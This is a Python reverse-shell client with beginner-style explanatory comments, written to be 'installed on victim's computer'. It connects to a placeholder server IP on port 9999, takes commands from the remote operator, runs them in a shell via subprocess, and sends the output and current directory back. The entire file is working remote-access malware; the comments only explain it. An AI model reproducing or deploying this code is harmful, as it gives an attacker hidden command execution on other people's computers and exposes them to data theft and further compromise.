# will be installed on victim's computer
#try this out
# Functions:
# Try and connect to our server
# Wait for our instructions
# Receives the instructions and runs them
# Take the result and send them back to the server

import socket # Need to import socket bc we need to connect this client.py to our server, which we need socket for
import os
import subprocess # These two packages are needed to execute the instructions recieved by the client

# subprocess is processes that exist on a windows computer. os stands for operating system

s = socket.socket()
host = '<INPUT HERE>' # IP Address of server ( used my local IP addr for this sake) # client uses this IP addr to connect to my server
port = 9999

#Binding host and port to socket is different in client file

s.connect((host, port)) # connecting to IP address of server (establishes connection to our server)

# in server.py, we use s.bind() because we don't need an actual IP address to be passed in bc we are using
# the server's local IP address

# Here we are connecting to that server, so we must provide the IP to that server


while True:
    data = s.recv(1024)

    #This decodes our data into utf-8 string format and then takes first 2 characters and checks if it is cd or not
    # Handling commands that return Unix no response
    if data[:2].decode("utf-8") ==  'cd':
        os.chdir(data[3:].decode("utf-8")) # For ex. in `cd "user pc", this gets the path after the cd and passes it to os.chdir, which
        # executes the command on the client computer.

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) # This gets the entire command sent by the hacker and Popen
        # creates a subprocess that executes the command on the client computer
        # shell = True gives us access to shell commands like dir.

        # stdout is the output of a command that is executed. stdin is the actual command. stderr is the output msg when you type in an invalid command

        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        # Now we need to send this output_str to our server. Our server will print out the client response

        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD)) # Sends output string and current working directory to server as client-response

        # I want this to print out on the client's computer as well bc I'm doing it for my friend (not a hacker)

        print(output_str) # prints it to client's computer







